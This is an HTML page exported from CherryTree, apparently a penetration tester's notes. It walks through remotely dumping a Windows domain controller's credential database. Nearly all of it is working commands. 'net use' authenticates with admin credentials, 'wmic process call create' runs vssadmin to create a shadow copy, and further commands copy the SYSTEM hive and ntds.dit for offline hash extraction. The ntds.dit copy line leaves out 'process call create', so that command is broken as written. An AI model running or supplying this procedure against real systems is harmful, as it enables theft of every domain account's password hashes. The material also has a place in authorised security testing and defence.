<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>recover ntds.dit from another Windows machine</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>recover ntds.dit from another Windows machine</h1><br/><br />1. Autheticate with the Domain Controller<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; net use <span style="color:#ff9d00;font-weight:700">\\</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;<span style="color:#00117f;font-weight:400">username-admin</span>&gt; &lt;password&gt;<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">dir</span> <span style="color:#ff9d00;font-weight:700">\\</span>TESTDC<span style="color:#ff9d00;font-weight:700">\</span>C$<span style="color:#ff9d00;font-weight:700">\</span>&lt;path&gt;</pre></div><br />    <a href=""><img src="images/1195-1.png" alt="images/1195-1.png" /></a><br />    <a href=""><img src="images/1195-2.png" alt="images/1195-2.png" /></a><br />2. List the current volume shadow copies, to see if we need to create one or there is already at least one<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;<span style="color:#00117f;font-weight:400">username-admin</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>&lt;password&gt; <span style="color:#ff9d00;font-weight:700">process</span> call create <span style="color:#3ad900;font-weight:400">&quot;cmd /c vssadmin list shadows 2&gt;&amp;1 &gt; C:\Users\Administrator\Desktop\listVolumeShadowCopies.txt&quot;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">type</span> <span style="color:#ff9d00;font-weight:700">\\</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt;<span style="color:#ff9d00;font-weight:700">\</span>C$<span style="color:#ff9d00;font-weight:700">\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Administrator<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span>listVolumeShadowCopies.txt</pre></div><br />    <a href=""><img src="images/1195-3.png" alt="images/1195-3.png" /></a><br />    <a href=""><img src="images/1195-4.png" alt="images/1195-4.png" /></a><br />3. How create a new Shadow copy<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;<span style="color:#00117f;font-weight:400">username-admin</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>&lt;password&gt; <span style="color:#ff9d00;font-weight:700">process</span> call create <span style="color:#3ad900;font-weight:400">&quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1 &gt; C:\Users\Administrator\Desktop\outputVssadmin.txt&quot;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">type</span> <span style="color:#ff9d00;font-weight:700">\\</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt;<span style="color:#ff9d00;font-weight:700">\</span>C$<span style="color:#ff9d00;font-weight:700">\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>Administrator<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span>outputVssadmin.txt</pre></div><br />    <a href=""><img src="images/1195-5.png" alt="images/1195-5.png" /></a><br />4. Copy SYSTEM and ntds.dit file<br />   ◇ SYSTEM file<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;<span style="color:#00117f;font-weight:400">username-admin</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>&lt;password&gt; <span style="color:#ff9d00;font-weight:700">process</span> call create <span style="color:#3ad900;font-weight:400">&quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SYSTEM C:\Users\Administrator\Desktop\SYSTEM&quot;</span></pre></div><br />   ◇ ntds.dit file<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; wmic <span style="color:#ff9d00;font-weight:700">/</span>node<span style="color:#ff9d00;font-weight:700">:</span>&lt;<span style="color:#00117f;font-weight:400">hostname-DC</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>&lt;DOMAIN&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;<span style="color:#00117f;font-weight:400">username-admin</span>&gt; <span style="color:#ff9d00;font-weight:700">/</span>password<span style="color:#ff9d00;font-weight:700">:</span>&lt;password&gt; <span style="color:#3ad900;font-weight:400">&quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit&quot;</span></pre></div><br />     <a href=""><img src="images/1195-6.png" alt="images/1195-6.png" /></a><br />       <br />Bibliography:<br />• <a href="https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/">https://malicious.link/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</a></div>
</body>
</html>
